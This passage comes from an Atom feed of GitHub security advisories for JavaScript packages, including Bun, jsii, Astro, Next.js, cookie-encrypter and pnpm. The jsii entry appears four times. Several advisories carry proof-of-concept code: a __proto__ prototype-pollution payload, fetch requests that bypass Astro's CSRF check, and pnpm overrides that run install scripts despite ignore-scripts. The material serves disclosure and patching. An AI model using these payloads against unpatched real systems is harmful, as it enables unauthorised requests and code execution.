<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56159">https://nvd.nist.gov/vuln/detail/CVE-2024-56159</a></li>
<li><a href="https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50">https://github.com/getsentry/sentry-javascript/blob/develop/packages/astro/src/integration/index.ts#L50</a></li>
<li><a href="https://github.com/advisories/GHSA-49w6-73cw-chjr">https://github.com/advisories/GHSA-49w6-73cw-chjr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-49w6-73cw-chjr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-19T15:12:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bun] Bun has an Application-level Prototype Pollution vulnerability in the runtime native API for Glo]]></title>
        <id>https://github.com/advisories/GHSA-v9mx-4pqq-h232</id>
        <link href="https://github.com/advisories/GHSA-v9mx-4pqq-h232"/>
        <updated>2024-12-18T16:56:07.000Z</updated>
        <content type="html"><![CDATA[<p>Versions of the package bun before 1.1.30 are vulnerable to Prototype Pollution due to improper input sanitization. An attacker can exploit this vulnerability through Bun's APIs that accept objects.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21548">https://nvd.nist.gov/vuln/detail/CVE-2024-21548</a></li>
<li><a href="https://github.com/oven-sh/bun/pull/14119">https://github.com/oven-sh/bun/pull/14119</a></li>
<li><a href="https://github.com/oven-sh/bun/commit/a234e067a5dc7837602df3fb5489e826920cc65a">https://github.com/oven-sh/bun/commit/a234e067a5dc7837602df3fb5489e826920cc65a</a></li>
<li><a href="https://security.snyk.io/vuln/SNYK-JS-BUN-8499549">https://security.snyk.io/vuln/SNYK-JS-BUN-8499549</a></li>
<li><a href="https://github.com/advisories/GHSA-v9mx-4pqq-h232">https://github.com/advisories/GHSA-v9mx-4pqq-h232</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v9mx-4pqq-h232</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-18T06:30:49.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsii] Prototype pollution in jsii.configureCategories]]></title>
        <id>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</id>
        <link href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2"/>
        <updated>2024-12-18T15:50:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.
When loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>
<h2 id="impact">Impact</h2>
<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named "category" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named "category", even if it shouldn't. </p>
<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>
<blockquote>
<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>
</blockquote>
<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>
<p><strong>Example:</strong></p>
<pre><code class="language-js">const jsii = require('jsii');

// prints 'undefined'
console.log(JSON.stringify({}.category))

// calling 'configureCategories' with user input
jsii.configureCategories(JSON.parse('{"__proto__": "user-input"}'))

// from this point onwards, every single object literal in the program
// will contain the 'category' key, with user controlled value
console.log(JSON.stringify({}.category)) // prints 'user-input'


// this can affect the execution of the main program in case it also makes 
// use of an object key called 'category'. for example, if the main programs 
// happens to have code like this:

const x = {} // some object in the main program (not necessarily empty)

if (x.category) {
  // this block will always be executed, effectively 
  // changing the behavior of the main program.
  console.log('Do something')
} else {
  console.log('Do something else')
}
</code></pre>
<p>For more information about javascript prototype pollution, see [1].</p>
<h2 id="patches">Patches</h2>
<p>A patch is included in versions <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">5.7.3</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">5.6.4</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">5.5.15</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">5.4.46</a></p>
<h2 id="workarounds">Workarounds</h2>
<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://learn.snyk.io/lesson/prototype-pollution/">https://learn.snyk.io/lesson/prototype-pollution/</a></p>
<p>[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/issue-reporting</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-12-18T15:50:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsii] Prototype pollution in jsii.configureCategories]]></title>
        <id>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</id>
        <link href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2"/>
        <updated>2024-12-18T15:50:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.
When loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>
<h2 id="impact">Impact</h2>
<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named "category" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named "category", even if it shouldn't. </p>
<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>
<blockquote>
<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>
</blockquote>
<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>
<p><strong>Example:</strong></p>
<pre><code class="language-js">const jsii = require('jsii');

// prints 'undefined'
console.log(JSON.stringify({}.category))

// calling 'configureCategories' with user input
jsii.configureCategories(JSON.parse('{"__proto__": "user-input"}'))

// from this point onwards, every single object literal in the program
// will contain the 'category' key, with user controlled value
console.log(JSON.stringify({}.category)) // prints 'user-input'


// this can affect the execution of the main program in case it also makes 
// use of an object key called 'category'. for example, if the main programs 
// happens to have code like this:

const x = {} // some object in the main program (not necessarily empty)

if (x.category) {
  // this block will always be executed, effectively 
  // changing the behavior of the main program.
  console.log('Do something')
} else {
  console.log('Do something else')
}
</code></pre>
<p>For more information about javascript prototype pollution, see [1].</p>
<h2 id="patches">Patches</h2>
<p>A patch is included in versions <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">5.7.3</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">5.6.4</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">5.5.15</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">5.4.46</a></p>
<h2 id="workarounds">Workarounds</h2>
<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://learn.snyk.io/lesson/prototype-pollution/">https://learn.snyk.io/lesson/prototype-pollution/</a></p>
<p>[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/issue-reporting</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-12-18T15:50:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsii] Prototype pollution in jsii.configureCategories]]></title>
        <id>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</id>
        <link href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2"/>
        <updated>2024-12-18T15:50:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.
When loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>
<h2 id="impact">Impact</h2>
<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named "category" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named "category", even if it shouldn't. </p>
<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>
<blockquote>
<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>
</blockquote>
<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>
<p><strong>Example:</strong></p>
<pre><code class="language-js">const jsii = require('jsii');

// prints 'undefined'
console.log(JSON.stringify({}.category))

// calling 'configureCategories' with user input
jsii.configureCategories(JSON.parse('{"__proto__": "user-input"}'))

// from this point onwards, every single object literal in the program
// will contain the 'category' key, with user controlled value
console.log(JSON.stringify({}.category)) // prints 'user-input'


// this can affect the execution of the main program in case it also makes 
// use of an object key called 'category'. for example, if the main programs 
// happens to have code like this:

const x = {} // some object in the main program (not necessarily empty)

if (x.category) {
  // this block will always be executed, effectively 
  // changing the behavior of the main program.
  console.log('Do something')
} else {
  console.log('Do something else')
}
</code></pre>
<p>For more information about javascript prototype pollution, see [1].</p>
<h2 id="patches">Patches</h2>
<p>A patch is included in versions <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">5.7.3</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">5.6.4</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">5.5.15</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">5.4.46</a></p>
<h2 id="workarounds">Workarounds</h2>
<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://learn.snyk.io/lesson/prototype-pollution/">https://learn.snyk.io/lesson/prototype-pollution/</a></p>
<p>[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/issue-reporting</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-12-18T15:50:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[jsii] Prototype pollution in jsii.configureCategories]]></title>
        <id>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</id>
        <link href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2"/>
        <updated>2024-12-18T15:50:11.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p><code>jsii</code> is a TypeScript to JavaScript compiler that also extracts an interface definition manifest to generate RPC stubs in various programming languages. jsii is typically used as a command-line tool, but it can also be loaded as a library.
When loaded as a library into a larger application, prototype pollution may happen if untrusted user input is passed to the library. When used as a command line-tool, this pollution cannot occur.</p>
<h2 id="impact">Impact</h2>
<p>You may be impacted if you have written an application that loads jsii as a library, and passes untrusted user input into the <code>jsii.configureCategories()</code> function. In that case, a user can craft input in such a way that, following the invocation, a field named "category" with a user-controlled value is added to the JavaScript Object prototype. This will cause every object in the program (both new and existing) to have a field named "category", even if it shouldn't. </p>
<p><strong>This will not affect jsii itself, but it might affect the application you have loaded jsii into.</strong></p>
<blockquote>
<p>The function <code>jsii.configureCategories()</code> is used to configure the severity (error, warning, etc.) of various jsii diagnostics.</p>
</blockquote>
<p><strong>Impacted versions: &lt;=5.7.2, &lt;=5.6.3, &lt;=5.5.14, &lt;=5.4.45</strong> </p>
<p><strong>Example:</strong></p>
<pre><code class="language-js">const jsii = require('jsii');

// prints 'undefined'
console.log(JSON.stringify({}.category))

// calling 'configureCategories' with user input
jsii.configureCategories(JSON.parse('{"__proto__": "user-input"}'))

// from this point onwards, every single object literal in the program
// will contain the 'category' key, with user controlled value
console.log(JSON.stringify({}.category)) // prints 'user-input'


// this can affect the execution of the main program in case it also makes 
// use of an object key called 'category'. for example, if the main programs 
// happens to have code like this:

const x = {} // some object in the main program (not necessarily empty)

if (x.category) {
  // this block will always be executed, effectively 
  // changing the behavior of the main program.
  console.log('Do something')
} else {
  console.log('Do something else')
}
</code></pre>
<p>For more information about javascript prototype pollution, see [1].</p>
<h2 id="patches">Patches</h2>
<p>A patch is included in versions <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">5.7.3</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">5.6.4</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">5.5.15</a>, <a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">5.4.46</a></p>
<h2 id="workarounds">Workarounds</h2>
<p>Sanitize user input to configureCategories() by stripping the <strong>proto</strong> property if detected.</p>
<h2 id="references">References</h2>
<p>If you have any questions or comments about this advisory, we ask that you contact AWS/Amazon Security via our issue reporting page [2] or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<p>[1] <a href="https://learn.snyk.io/lesson/prototype-pollution/">https://learn.snyk.io/lesson/prototype-pollution/</a></p>
<p>[2] <a href="https://aws.amazon.com/security/vulnerability-reporting">https://aws.amazon.com/security/issue-reporting</a></p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/aws/jsii-compiler/security/advisories/GHSA-m56h-5xx3-2jc2</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.4.46">https://github.com/aws/jsii-compiler/releases/tag/v5.4.46</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.5.15">https://github.com/aws/jsii-compiler/releases/tag/v5.5.15</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.6.4">https://github.com/aws/jsii-compiler/releases/tag/v5.6.4</a></li>
<li><a href="https://github.com/aws/jsii-compiler/releases/tag/v5.7.3">https://github.com/aws/jsii-compiler/releases/tag/v5.7.3</a></li>
<li><a href="https://github.com/advisories/GHSA-m56h-5xx3-2jc2">https://github.com/advisories/GHSA-m56h-5xx3-2jc2</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m56h-5xx3-2jc2</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2024-12-18T15:50:09.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[astro] Atro CSRF Middleware Bypass (security.checkOrigin)]]></title>
        <id>https://github.com/advisories/GHSA-c4pw-33h3-35xw</id>
        <link href="https://github.com/advisories/GHSA-c4pw-33h3-35xw"/>
        <updated>2024-12-18T21:52:49.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A bug in Astro’s CSRF-protection middleware allows requests to bypass CSRF checks.</p>
<h3 id="details">Details</h3>
<p>When the <code>security.checkOrigin</code> configuration option is set to <code>true</code>, Astro middleware will perform a CSRF check. (Source code: <a href="https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts">https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts</a>)</p>
<p>For example, with the following Astro configuration:</p>
<pre><code class="language-js">// astro.config.mjs
import { defineConfig } from 'astro/config';
import node from '@astrojs/node';

export default defineConfig({
    output: 'server',
    security: { checkOrigin: true },
    adapter: node({ mode: 'standalone' }),
});
</code></pre>
<p>A request like the following would be blocked if made from a different origin:</p>
<pre><code class="language-js">// fetch API or &lt;form action="https://test.example.com/" method="POST"&gt;
fetch('https://test.example.com/', {
    method: 'POST',
    credentials: 'include',
    body: 'a=b',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
});
// =&gt; Cross-site POST form submissions are forbidden
</code></pre>
<p>However, a vulnerability exists that can bypass this security.</p>
<h4 id="pattern-1-requests-with-a-semicolon-after-the-content-type">Pattern 1: Requests with a semicolon after the <code>Content-Type</code></h4>
<p>A semicolon-delimited parameter is allowed after the type in <code>Content-Type</code>.</p>
<p>Web browsers will treat a <code>Content-Type</code> such as <code>application/x-www-form-urlencoded; abc</code> as a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests">simple request</a> and will not perform preflight validation. In this case, CSRF is not blocked as expected.</p>
<pre><code class="language-js">fetch('https://test.example.com', {
    method: 'POST',
    credentials: 'include',
    body: 'test',
    headers: { 'Content-Type': 'application/x-www-form-urlencoded; abc' },
});
// =&gt; Server-side functions are executed (Response Code 200).
</code></pre>
<h4 id="pattern-2-request-without-content-type-header">Pattern 2: Request without <code>Content-Type</code> header</h4>
<p>The <code>Content-Type</code> header is not required for a request. The following examples are sent without a <code>Content-Type</code> header, resulting in CSRF.</p>
<pre><code class="language-js">// Pattern 2.1 Request without body
fetch('http://test.example.com', { method: 'POST', credentials: 'include' });

// Pattern 2.2 Blob object without type
fetch('https://test.example.com', {
    method: 'POST',
    credentials: 'include',
    body: new Blob(['a=b'], {}),
});
</code></pre>
<h3 id="impact">Impact</h3>
<p>Bypass CSRF protection implemented with CSRF middleware.</p>
<blockquote>
<p>[!Note]
Even with <code>credentials: 'include'</code>, browsers may not send cookies due to third-party cookie blocking. This feature depends on the browser version and settings, and is for privacy protection, not as a CSRF measure.</p>
</blockquote>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/withastro/astro/security/advisories/GHSA-c4pw-33h3-35xw">https://github.com/withastro/astro/security/advisories/GHSA-c4pw-33h3-35xw</a></li>
<li><a href="https://github.com/withastro/astro/commit/e7d14c374b9d45e27089994a4eb72186d05514de">https://github.com/withastro/astro/commit/e7d14c374b9d45e27089994a4eb72186d05514de</a></li>
<li><a href="https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts">https://github.com/withastro/astro/blob/6031962ab5f56457de986eb82bd24807e926ba1b/packages/astro/src/core/app/middlewares.ts</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-56140">https://nvd.nist.gov/vuln/detail/CVE-2024-56140</a></li>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests">https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests</a></li>
<li><a href="https://github.com/advisories/GHSA-c4pw-33h3-35xw">https://github.com/advisories/GHSA-c4pw-33h3-35xw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-c4pw-33h3-35xw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-12-18T15:02:37.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[next] Next.js authorization bypass vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-7gfc-8cq8-jh5f</id>
        <link href="https://github.com/advisories/GHSA-7gfc-8cq8-jh5f"/>
        <updated>2024-12-19T15:04:24.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If a Next.js application is performing authorization in middleware based on pathname, it was possible for this authorization to be bypassed.</p>
<h3 id="patches">Patches</h3>
<p>This issue was patched in Next.js <code>14.2.15</code> and later.</p>
<p>If your Next.js application is hosted on Vercel, this vulnerability has been automatically mitigated, regardless of Next.js version.</p>
<h3 id="workarounds">Workarounds</h3>
<p>There are no official workarounds for this vulnerability.</p>
<h4 id="credits">Credits</h4>
<p>We'd like to thank <a href="http://github.com/tyage">tyage</a> (GMO CyberSecurity by IERAE) for responsible disclosure of this issue.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/vercel/next.js/security/advisories/GHSA-7gfc-8cq8-jh5f">https://github.com/vercel/next.js/security/advisories/GHSA-7gfc-8cq8-jh5f</a></li>
<li><a href="https://github.com/vercel/next.js/commit/1c8234eb20bc8afd396b89999a00f06b61d72d7b">https://github.com/vercel/next.js/commit/1c8234eb20bc8afd396b89999a00f06b61d72d7b</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-51479">https://nvd.nist.gov/vuln/detail/CVE-2024-51479</a></li>
<li><a href="https://github.com/vercel/next.js/releases/tag/v14.2.15">https://github.com/vercel/next.js/releases/tag/v14.2.15</a></li>
<li><a href="https://github.com/advisories/GHSA-7gfc-8cq8-jh5f">https://github.com/advisories/GHSA-7gfc-8cq8-jh5f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-7gfc-8cq8-jh5f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-17T15:09:06.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[cookie-encrypter] Bit flip attack vulnerability in cookie-encrypter]]></title>
        <id>https://github.com/advisories/GHSA-h63v-hw6g-x8hp</id>
        <link href="https://github.com/advisories/GHSA-h63v-hw6g-x8hp"/>
        <updated>2024-12-12T15:31:49.000Z</updated>
        <content type="html"><![CDATA[<p>due to a weakness in the encryption method used in cookie-encrypter an attack can use the world visible IV to edit encrypted cookies without decrypting the cookie itself. This is known as an AES CBC bit flipping attack.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-53441">https://nvd.nist.gov/vuln/detail/CVE-2024-53441</a></li>
<li><a href="https://gist.github.com/mathysEthical/f45f1503f87381090e38a33c50eec971">https://gist.github.com/mathysEthical/f45f1503f87381090e38a33c50eec971</a></li>
<li><a href="https://mathys.reboux.pro/CVE/2024/53441">https://mathys.reboux.pro/CVE/2024/53441</a></li>
<li><a href="https://github.com/ebourmalo/cookie-encrypter/issues/9">https://github.com/ebourmalo/cookie-encrypter/issues/9</a></li>
<li><a href="https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode">https://crypto.stackexchange.com/questions/66085/bit-flipping-attack-on-cbc-mode</a></li>
<li><a href="https://github.com/advisories/GHSA-h63v-hw6g-x8hp">https://github.com/advisories/GHSA-h63v-hw6g-x8hp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h63v-hw6g-x8hp</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-12-09T21:31:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[pnpm] pnpm no-script global cache poisoning via overrides / `ignore-scripts` evasion]]></title>
        <id>https://github.com/advisories/GHSA-vm32-9rqf-rh3r</id>
        <link href="https://github.com/advisories/GHSA-vm32-9rqf-rh3r"/>
        <updated>2024-12-10T22:42:44.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>pnpm seems to mishandle overrides and global cache:</p>
<ol>
<li>Overrides from one workspace leak into npm metadata saved in global cache</li>
<li>npm metadata from global cache affects other workspaces</li>
<li>installs by default don't revalidate the data (including on first lockfile generation)</li>
</ol>
<p>This can make workspace A (even running with <code>ignore-scripts=true</code>) posion global cache and execute scripts in workspace B</p>
<p>Users generally expect <code>ignore-scripts</code> to be sufficient to prevent immediate code execution on install (e.g. when the tree is just repacked/bundled without executing it).</p>
<p>Here, that expectation is broken</p>
<h3 id="details">Details</h3>
<p>See PoC.</p>
<p>In it, overrides from a single run of A get leaked into e.g. <code>~/Library/Caches/pnpm/metadata/registry.npmjs.org/rimraf.json</code> and persistently affect all other projects using the cache</p>
<h3 id="poc">PoC</h3>
<p>Postinstall code used in PoC is benign and can be inspected in <a href="https://www.npmjs.com/package/ponyhooves?activeTab=code">https://www.npmjs.com/package/ponyhooves?activeTab=code</a>, it's just a <code>console.log</code></p>
<ol>
<li>Remove store and cache
On mac: <code>rm -rf ~/Library/Caches/pnpm ~/Library/pnpm/store</code>
This step is not required in general, but we'll be using a popular package for PoC that's likely cached</li>
<li>Create <code>A/package.json</code>:<pre><code class="language-json">{
  "name": "A",
  "pnpm": { "overrides": { "rimraf&gt;glob": "npm:ponyhooves@1" } },
  "dependencies": { "rimraf": "6.0.1" }
}
</code></pre>
Install it with <code>pnpm i --ignore-scripts</code> (the flag is not required, but the point of the demo is to show that it doesn't help)</li>
<li>Create <code>B/package.json</code>:<pre><code class="language-json">{
  "name": "B",
  "dependencies": { "rimraf": "6.0.1" }
}
</code></pre>
Install it with <code>pnpm i</code></li>
</ol>
<p>Result:</p>
<pre><code class="language-console">Packages: +3
+++
Progress: resolved 3, reused 3, downloaded 0, added 3, done
node_modules/.pnpm/ponyhooves@1.0.1/node_modules/ponyhooves: Running postinstall script, done in 51ms

dependencies:
+ rimraf 6.0.1

Done in 1.4s
</code></pre>
<p>Also, that code got leaked into another project and it's lockfile now! </p>
<h3 id="impact">Impact</h3>
<p>Global state integrity is lost via operations that one would expect to be secure, enabling subsequently running arbitrary code execution on installs</p>
<p>As a work-around, use separate cache and store dirs in each workspace</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r">https://github.com/pnpm/pnpm/security/advisories/GHSA-vm32-9rqf-rh3r</a></li>
